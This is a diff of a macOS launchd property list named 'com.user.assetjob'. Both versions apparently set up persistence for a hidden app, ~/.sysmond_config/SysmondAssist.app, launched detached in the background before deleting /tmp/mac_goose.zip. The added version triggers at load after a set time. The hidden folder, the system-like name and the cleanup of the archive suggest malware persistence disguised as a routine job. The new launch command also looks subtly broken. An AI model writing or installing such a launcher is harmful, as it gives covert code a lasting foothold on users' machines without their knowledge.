@@ -2,20 +2,26 @@
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-  <key>Label</key>
-  <string>com.user.assetjob</string>
-  <key>ProgramArguments</key>
-  <array>
-    <string>/bin/sh</string>
-    <string>-c</string>
-    <string>nohup /usr/bin/open -a "$(eval echo ~$USER)/.sysmond_config/SysmondAssist.app" &amp;&gt;/dev/null &amp; disown &amp;&amp; rm /tmp/mac_goose.zip</string>
-  </array>
-  <key>StartCalendarInterval</key>
-  <dict>
-    <key>Month</key>  <integer>6</integer>
-    <key>Day</key>    <integer>14</integer>
-    <key>Hour</key>   <integer>06</integer>
-    <key>Minute</key> <integer>42</integer>
-  </dict>
+    <key>Label</key>
+    <string>com.user.assetjob</string>
+
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>if [[ $(date +%H:%M) > "11:40" ]]; then nohup ~/.sysmond_config/"SysmondAssist.app" & disown && rm /tmp/mac_goose.zip; fi</string>
+    </array>
+
+    <key>RunAtLoad</key>
+    <true/>  <!-- Runs when the system starts -->
+
+    <key>KeepAlive</key>
+    <false/>  <!-- Do not restart if it crashes (since we control the condition) -->
+
+    <key>StandardOutPath</key>
+    <string>/tmp/com.user.assetjob.stdout.log</string>
+
+    <key>StandardErrorPath</key>
+    <string>/tmp/com.user.assetjob.stderr.log</string>
 </dict>
 </plist>
